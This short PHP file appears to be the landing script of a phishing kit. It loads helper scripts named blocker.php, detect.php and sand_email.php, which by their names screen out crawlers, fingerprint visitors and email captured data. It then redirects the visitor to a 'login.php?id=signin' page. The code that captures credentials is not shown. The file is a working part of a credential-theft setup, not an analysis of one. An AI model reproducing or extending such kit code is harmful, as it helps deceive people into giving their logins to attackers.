<?php

include("../systemtotal/system/blocker.php");
include("../systemtotal/system/detect.php");
include("../systemtotal/system/sand_email.php");



$random = rand(0, 100000000000);
$dis    = substr(md5($random), 0, 25);


header('Location: login.php?id=signin');
